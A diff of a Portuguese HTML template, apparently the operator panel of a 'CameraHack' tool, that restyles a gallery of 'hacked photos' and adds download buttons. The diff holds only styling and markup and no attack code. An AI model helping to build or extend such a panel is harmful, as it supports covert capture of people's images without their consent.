@@ -1,14 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-br">
 <head>
-    <title>Fotos</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CameraHack - Fotos</title>
     <style>
         body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: monospace;
             margin: 0;
             padding: 20px;
+            background: #000;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
         }
         .container {
             max-width: 1200px;
@@ -16,67 +18,78 @@
         }
         h1 {
             text-align: center;
-            color: #00ff00;
-            text-shadow: 2px 2px 4px rgba(0, 255, 0, 0.5);
-            border-bottom: 2px solid #00ff00;
-            padding-bottom: 10px;
+            margin-bottom: 30px;
         }
         .gallery {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 20px;
-            padding: 20px 0;
+            padding: 20px;
         }
         .photo-card {
+            background: #111;
             border: 1px solid #00ff00;
             padding: 10px;
-            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
         }
-        img {
+        .photo-card img {
             width: 100%;
             height: auto;
-            border: 1px solid #00ff00;
-            transition: transform 0.3s ease;
+            margin-bottom: 10px;
         }
-        img:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
-        }
-        .photo-info {
-            margin-top: 10px;
-            text-align: center;
-            color: #00ff00;
-        }
-        button, a {
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
             background: #000;
             color: #00ff00;
             border: 1px solid #00ff00;
-            padding: 10px 20px;
-            cursor: pointer;
             text-decoration: none;
-            display: inline-block;
-            margin: 10px 0;
+            margin: 10px;
+            cursor: pointer;
+            font-family: 'Share Tech Mono', monospace;
         }
-        button:hover, a:hover {
+        .button:hover {
             background: #00ff00;
             color: #000;
             box-shadow: 0 0 10px #00ff00;
         }
+        .controls {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .download-btn {
+            width: 100%;
+            text-align: center;
+            margin: 5px 0;
+        }
+        .download-btn .button {
+            width: 80%;
+            margin: 0;
+        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
-        <h1>Fotos Capturadas</h1>
+        <h1>Fotos Hackeadas</h1>
+
         <div class="gallery">
             {% for foto in fotos %}
             <div class="photo-card">
-                <img src="/uploads/fotos/{{ foto }}" alt="{{ foto }}" class="foto">
-                <div class="photo-info">{{ foto }}</div>
+                <img src="/uploads/fotos/{{ foto }}" alt="Foto hackeada">
+                <div class="download-btn">
+                    <a href="/uploads/fotos/{{ foto }}" download class="button">
+                        DOWNLOAD 📥
+                    </a>
+                </div>
             </div>
             {% endfor %}
         </div>
-        <button onclick="window.location.reload()">Carregar Novas Fotos</button>
-        <p><a href="/">Voltar para o Painel</a></p>
+
+        <div class="controls">
+            <button onclick="location.reload()" class="button">Recarregar</button>
+            <a href="/" class="button">Voltar</a>
+        </div>
     </div>
 </body>
 </html>
